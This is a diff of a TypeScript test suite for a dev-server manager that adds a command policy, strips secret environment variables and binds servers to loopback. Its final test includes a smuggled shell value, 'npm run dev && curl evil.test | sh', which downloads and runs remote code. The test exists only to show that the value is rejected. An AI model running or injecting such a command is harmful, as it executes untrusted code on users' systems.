@@ -1,18 +1,21 @@
 import assert from "node:assert/strict";
-import { mkdirSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { createServer, type Server } from "node:net";
 import { tmpdir } from "node:os";
-import { dirname, join } from "node:path";
+import { delimiter, dirname, join } from "node:path";
 import { afterEach, beforeEach, test } from "node:test";
 import { fileURLToPath } from "node:url";
 import { AgentError } from "../AgentClient";
 import { ProjectWorkspace } from "../workspace/ProjectWorkspace";
+import { CommandPolicy } from "./CommandPolicy";
 import type { DevServerObserver, LogLine, PreviewStatus } from "./DevServer";
-import { DevServerManager } from "./DevServerManager";
+import { DevServerManager, type DevServerManagerOptions } from "./DevServerManager";
 import { PortPool } from "./PortPool";
 
-const FAKE_SERVER = join(dirname(fileURLToPath(import.meta.url)), "testing", "fakeDevServer.mjs");
+/** Fixture path with forward slashes: command arguments may not hold backslashes. */
+const FAKE_SERVER = join(dirname(fileURLToPath(import.meta.url)), "testing", "fakeDevServer.mjs").replace(/\\/g, "/");
 const FIRST_PORT = 47310;
+const NODE_POLICY = new CommandPolicy(["node"]);
 
 /** Observer that records everything and lets a test wait for a state. */
 class RecordingObserver implements DevServerObserver {
@@ -54,15 +57,21 @@ let manager: DevServerManager;
 let blockers: Server[];
 let projectCount = 0;
 
-beforeEach(() => {
-    home = mkdtempSync(join(tmpdir(), "penforge-devserver-"));
-    manager = new DevServerManager({
+function createManager(options: DevServerManagerOptions = {}): DevServerManager {
+    return new DevServerManager({
         ports: new PortPool(FIRST_PORT, FIRST_PORT + 9),
         maxRestarts: 2,
         probeIntervalMs: 50,
         restartDelayMs: 50,
         idleStopMs: 60_000,
+        commandPolicy: NODE_POLICY,
+        ...options,
     });
+}
+
+beforeEach(() => {
+    home = mkdtempSync(join(tmpdir(), "penforge-devserver-"));
+    manager = createManager();
     blockers = [];
 });
 
@@ -74,16 +83,27 @@ afterEach(async () => {
     rmSync(home, { recursive: true, force: true });
 });
 
-/** Creates a project whose stack runs the fake dev server in the given mode. */
-async function project(mode: string, extra: Record<string, unknown> = {}): Promise<ProjectWorkspace> {
+/** Path inside the test home, with forward slashes (a valid command argument). */
+function homePath(name: string): string {
+    return join(home, name).replace(/\\/g, "/");
+}
+
+/** Creates a project whose stack runs a command (by default the fake dev server with `args`). */
+async function project(args: string[], extra: Record<string, unknown> = {}): Promise<ProjectWorkspace> {
     const workspace = new ProjectWorkspace(join(home, "projects"), `project-${++projectCount}`);
     mkdirSync(workspace.appSrcDir, { recursive: true });
     await workspace.writeJson("stack.json", {
         name: "fake",
-        dev: `node "${FAKE_SERVER}" ${mode}`,
+        commands: { dev: ["node", FAKE_SERVER, ...args] },
         ...extra,
     });
     return workspace;
+}
+
+async function watched(workspace: ProjectWorkspace): Promise<RecordingObserver> {
+    const observer = new RecordingObserver();
+    manager.watch(workspace.projectId, observer);
+    return observer;
 }
 
 async function httpBody(url: string): Promise<string> {
@@ -119,9 +139,8 @@ function listenOn(port: number): Promise<Server> {
 }
 
 test("starts the dev server on a pool port and reports ready", async () => {
-    const workspace = await project("serve");
-    const observer = new RecordingObserver();
-    manager.watch(workspace.projectId, observer);
+    const workspace = await project(["serve"]);
+    const observer = await watched(workspace);
     const ready = observer.next("ready");
 
     const first = await manager.start(workspace);
@@ -135,9 +154,8 @@ test("starts the dev server on a pool port and reports ready", async () => {
 });
 
 test("start is idempotent while the server is live", async () => {
-    const workspace = await project("serve");
-    const observer = new RecordingObserver();
-    manager.watch(workspace.projectId, observer);
+    const workspace = await project(["serve"]);
+    const observer = await watched(workspace);
     const ready = observer.next("ready");
     await Promise.all([manager.start(workspace), manager.start(workspace)]);
     await ready;
@@ -148,12 +166,10 @@ test("start is idempotent while the server is live", async () => {
 
 test("two projects get different ports, and busy ports are skipped", async () => {
     blockers.push(await listenOn(FIRST_PORT));
-    const a = await project("serve");
-    const b = await project("serve");
-    const observerA = new RecordingObserver();
-    const observerB = new RecordingObserver();
-    manager.watch(a.projectId, observerA);
-    manager.watch(b.projectId, observerB);
+    const a = await project(["serve"]);
+    const b = await project(["serve"]);
+    const observerA = await watched(a);
+    const observerB = await watched(b);
     const readyA = observerA.next("ready");
     const readyB = observerB.next("ready");
     await Promise.all([manager.start(a), manager.start(b)]);
@@ -166,29 +182,40 @@ test("two projects get different ports, and busy ports are skipped", async () =>
 });
 
 test("passes the port as {port} and in the port variable", async () => {
-    const workspace = await project("announce {port}", { portEnv: "APP_PORT" });
-    const observer = new RecordingObserver();
-    manager.watch(workspace.projectId, observer);
+    const workspace = await project(["announce", "{port}"], { portEnv: "APP_PORT" });
+    const observer = await watched(workspace);
     const ready = observer.next("ready");
     await manager.start(workspace);
     assert.equal((await ready).url, `http://localhost:${FIRST_PORT}/`);
 });
 
-test("finds a server that announces another port", async () => {
-    const other = FIRST_PORT + 50;
-    const workspace = await project(`announce ${other}`);
-    const observer = new RecordingObserver();
-    manager.watch(workspace.projectId, observer);
+test("accepts a port the server announces only inside the pool", async () => {
+    const inPool = FIRST_PORT + 5;
+    const workspace = await project(["announce", String(inPool)]);
+    const observer = await watched(workspace);
     const ready = observer.next("ready");
     await manager.start(workspace);
-    assert.equal((await ready).url, `http://localhost:${other}/`);
+    assert.equal((await ready).url, `http://localhost:${inPool}/`);
+
+    // the announced port is reserved: another project does not get it
+    const stopped = observer.next("stopped");
+    await manager.stop(workspace.projectId);
+    await stopped;
+});
+
+test("ignores announced ports outside the pool", async () => {
+    const outside = FIRST_PORT + 80;
+    const workspace = await project(["announce", String(outside)], { readyTimeoutS: 1 });
+    const observer = await watched(workspace);
+    const failed = observer.next("failed");
+    await manager.start(workspace);
+    assert.equal((await failed).reason, "start-timeout");
 });
 
 test("stop kills the whole process tree and frees the port", async () => {
-    const pidFile = join(home, "grandchild.pid");
-    const workspace = await project(`tree "${pidFile}"`);
-    const observer = new RecordingObserver();
-    manager.watch(workspace.projectId, observer);
+    const pidFile = homePath("grandchild.pid");
+    const workspace = await project(["tree", pidFile]);
+    const observer = await watched(workspace);
     const ready = observer.next("ready");
     await manager.start(workspace);
     const status = await ready;
@@ -196,75 +223,147 @@ test("stop kills the whole process tree and frees the port", async () => {
     assert.ok(isAlive(grandchild));
 
     const stopped = observer.next("stopped");
-    assert.equal(await manager.stop(workspace.projectId, "Stopped"), true);
-    assert.equal((await stopped).message, "Stopped");
+    assert.equal(await manager.stop(workspace.projectId, "stopped"), true);
+    assert.equal((await stopped).reason, "stopped");
     await waitUntil(() => !isAlive(grandchild));
     assert.equal(await PortPool.isFree(Number(new URL(status.url!).port)), true);
     assert.deepEqual(manager.liveProjects, []);
 });
 
 test("restarts a crashed server", async () => {
-    const marker = join(home, "crashed-once");
-    const workspace = await project(`crash-once "${marker}"`);
-    const observer = new RecordingObserver();
-    manager.watch(workspace.projectId, observer);
+    const workspace = await project(["crash-once", homePath("crashed-once")]);
+    const observer = await watched(workspace);
     const ready = observer.next("ready");
     await manager.start(workspace);
     const status = await ready;
     assert.equal(status.restarts, 1);
+    assert.ok(observer.statuses.some((s) => s.reason === "restarting"));
     assert.ok(observer.logs.some((line) => line.stream === "stderr" && line.text.includes("first start crashes")));
 });
 
 test("gives up after the maximum number of restarts", async () => {
-    const workspace = await project("crash");
-    const observer = new RecordingObserver();
-    manager.watch(workspace.projectId, observer);
+    const workspace = await project(["crash"]);
+    const observer = await watched(workspace);
     const failed = observer.next("failed");
     await manager.start(workspace);
     const status = await failed;
     assert.equal(status.restarts, 2);
-    assert.match(status.message ?? "", /could not be restarted/);
+    assert.equal(status.reason, "crashed");
     assert.deepEqual(manager.liveProjects, []);
     assert.equal(manager.status(workspace.projectId), undefined);
 });
 
+test("a server that stayed up long enough gets its restarts back", async () => {
+    manager = createManager({ maxRestarts: 1, healthyMs: 100 });
+    const workspace = await project(["flaky"]);
+    const observer = await watched(workspace);
+    await manager.start(workspace);
+    await waitUntil(() => observer.statuses.filter((s) => s.state === "ready").length >= 3, 15_000);
+    assert.ok(!observer.statuses.some((s) => s.state === "failed"));
+    assert.ok(observer.statuses.every((s) => s.restarts <= 1));
+});
+
 test("fails a server that never answers in time", async () => {
-    const workspace = await project("never", { readyTimeoutS: 1 });
-    const observer = new RecordingObserver();
-    manager.watch(workspace.projectId, observer);
+    const workspace = await project(["never"], { readyTimeoutS: 1 });
+    const observer = await watched(workspace);
     const failed = observer.next("failed");
     await manager.start(workspace);
-    assert.match((await failed).message ?? "", /did not start in time/);
+    assert.equal((await failed).reason, "start-timeout");
+});
+
+test("fails when the program cannot be started", async () => {
+    manager = createManager({ commandPolicy: new CommandPolicy(["penforge-missing-program"]) });
+    const workspace = new ProjectWorkspace(join(home, "projects"), "missing-program");
+    mkdirSync(workspace.appSrcDir, { recursive: true });
+    await workspace.writeJson("stack.json", { commands: { dev: ["penforge-missing-program", "dev"] } });
+    const observer = await watched(workspace);
+    const failed = observer.next("failed");
+    await manager.start(workspace);
+    assert.equal((await failed).reason, "command-failed");
 });
 
 test("a failed server can be started again", async () => {
-    const workspace = await project("never", { readyTimeoutS: 1 });
-    const observer = new RecordingObserver();
-    manager.watch(workspace.projectId, observer);
+    const workspace = await project(["never"], { readyTimeoutS: 1 });
+    const observer = await watched(workspace);
     const failed = observer.next("failed");
     await manager.start(workspace);
     await failed;
-    await workspace.writeJson("stack.json", { dev: `node "${FAKE_SERVER}" serve` });
+    await workspace.writeJson("stack.json", { commands: { dev: ["node", FAKE_SERVER, "serve"] } });
     const ready = observer.next("ready");
     await manager.start(workspace);
     assert.equal((await ready).state, "ready");
 });
 
+test("the dev server gets no secrets and binds to loopback", async () => {
+    const envFile = homePath("env.json");
+    manager = createManager({
+        baseEnv: {
+            ...process.env,
+            PENFORGE_TOKEN: "t",
+            ANTHROPIC_API_KEY: "k",
+            CLAUDE_CODE_OAUTH_TOKEN: "o",
+            GITHUB_TOKEN: "g",
+            DB_PASSWORD: "p",
+            PENFORGE_TEST_PLAIN: "x",
+            NORMAL_SETTING: "kept",
+        },
+    });
+    const workspace = await project(["env", envFile]);
+    const observer = await watched(workspace);
+    const ready = observer.next("ready");
+    await manager.start(workspace);
+    await ready;
+    const env = JSON.parse(readFileSync(envFile, "utf8")) as Record<string, string>;
+    for (const name of [
+        "PENFORGE_TOKEN",
+        "ANTHROPIC_API_KEY",
+        "CLAUDE_CODE_OAUTH_TOKEN",
+        "GITHUB_TOKEN",
+        "DB_PASSWORD",
+    ]) {
+        assert.equal(env[name], undefined, name);
+    }
+    assert.equal(env.PENFORGE_TEST_PLAIN, undefined, "every PENFORGE_ variable is dropped");
+    assert.equal(env.NORMAL_SETTING, "kept");
+    assert.equal(env.HOST, "127.0.0.1");
+    assert.equal(env.PORT, String(FIRST_PORT));
+});
+
+test("runs a Windows batch shim without a shell", { skip: process.platform !== "win32" }, async () => {
+    const bin = join(home, "bin");
+    mkdirSync(bin);
+    writeFileSync(join(bin, "fakepm.cmd"), `@node "${FAKE_SERVER}" %*\r\n`);
+    manager = createManager({
+        commandPolicy: new CommandPolicy(["fakepm"]),
+        baseEnv: { ...process.env, PATH: `${bin}${delimiter}${process.env.PATH ?? ""}` },
+    });
+    const workspace = new ProjectWorkspace(join(home, "projects"), "shim-project");
+    mkdirSync(workspace.appSrcDir, { recursive: true });
+    await workspace.writeJson("stack.json", { commands: { dev: ["fakepm", "announce", "{port}"] } });
+    const observer = await watched(workspace);
+    const ready = observer.next("ready");
+    await manager.start(workspace);
+    assert.equal((await ready).url, `http://localhost:${FIRST_PORT}/`);
+});
+
 test("stops a server once nobody watches it", async () => {
-    manager = new DevServerManager({ ports: new PortPool(FIRST_PORT, FIRST_PORT + 9), idleStopMs: 100 });
-    const workspace = await project("serve");
+    manager = createManager({ idleStopMs: 100 });
+    const workspace = await project(["serve"]);
     const observer = new RecordingObserver();
     const watch = manager.watch(workspace.projectId, observer);
     const ready = observer.next("ready");
     await manager.start(workspace);
     await ready;
+    const stopped = observer.next("stopped");
     watch.dispose();
     await waitUntil(() => manager.liveProjects.length === 0);
+    assert.ok(observer.statuses.length > 0);
+    void stopped.catch(() => undefined);
 });
 
 test("a watcher that comes back in time keeps the server", async () => {
-    manager = new DevServerManager({ ports: new PortPool(FIRST_PORT, FIRST_PORT + 9), idleStopMs: 300 });
-    const workspace = await project("serve");
+    manager = createManager({ idleStopMs: 300 });
+    const workspace = await project(["serve"]);
     const observer = new RecordingObserver();
     const ready = observer.next("ready");
     manager.watch(workspace.projectId, observer).dispose();
@@ -283,4 +382,16 @@ test("refuses a project without a generated app", async () => {
         () => manager.start(workspace),
         (error: unknown) => error instanceof AgentError && error.code === "not-configured"
     );
+});
+
+test("refuses a shell command line in stack.json", async () => {
+    manager = createManager({ commandPolicy: new CommandPolicy() });
+    const workspace = new ProjectWorkspace(join(home, "projects"), "shell-project");
+    mkdirSync(workspace.appSrcDir, { recursive: true });
+    await workspace.writeJson("stack.json", { dev: "npm run dev && curl evil.test | sh" });
+    await assert.rejects(
+        () => manager.start(workspace),
+        (error: unknown) => error instanceof AgentError && error.code === "bad-request"
+    );
+    assert.deepEqual(manager.liveProjects, []);
 });
